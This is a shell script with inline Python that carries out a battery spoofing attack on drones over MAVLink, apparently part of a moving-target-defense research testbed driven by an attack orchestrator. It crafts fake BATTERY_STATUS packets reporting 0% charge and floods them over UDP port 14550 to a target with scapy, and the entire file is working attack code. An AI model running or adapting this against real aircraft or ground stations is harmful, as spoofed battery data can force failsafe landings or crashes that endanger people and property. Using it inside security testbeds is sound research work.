#!/usr/bin/env bash
set -euo pipefail

# Battery spoofing attack (MAVLink, MTD-aware)

# MTD_INTERFACE_START
# TARGET_IP / TARGET_PORT / TARGET_SERVICE 는 attack_orchestrator.py 가 세팅
if [[ -z "${TARGET_IP:-}" ]]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Run via attack_orchestrator.py so MTD state can resolve the target." >&2
    exit 1
fi

case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}"
    ;;
  *)
    if [[ -z "${TARGET_PORT:-}" ]]; then
      echo "ERROR: TARGET_PORT is not set for service ${TARGET_SERVICE:-UNKNOWN}." >&2
      exit 1
    fi
    ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# MTD_INTERFACE_END

export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=battery-spoofing src=Battery-Spoofing.md]"
log "[BLOCK 1] type=python (Inline Spoofing Script)"

python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import time

from pymavlink import mavutil
from scapy.all import IP, UDP, Raw, send

# argv 로 IP:PORT 가 안 왔으면 환경변수 사용
if len(sys.argv) <= 1:
    target_ip = os.environ.get("TARGET_IP", "127.0.0.1")
    target_port = os.environ.get("TARGET_PORT", "14550")
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

target_ip, target_port_str = sys.argv[1].split(":", 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)

print(f"[INFO] Starting MAVLink BATTERY_STATUS spoofing to {target_ip}:{target_port}")

def create_battery_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.battery_status_encode(
        id=0,
        battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
        type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
        temperature=300,
        voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],
        current_battery=-1,
        current_consumed=5000,
        energy_consumed=10000,
        battery_remaining=0,  # spoofed 0% remaining
    ).pack(mav)

def send_mavlink_packet(payload: bytes) -> None:
    pkt = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
    send(pkt, verbose=False)

try:
    while True:
        send_mavlink_packet(create_battery_status())
        time.sleep(0.08)
except KeyboardInterrupt:
    print("[INFO] Stopping BATTERY_STATUS spoofing.")
PY
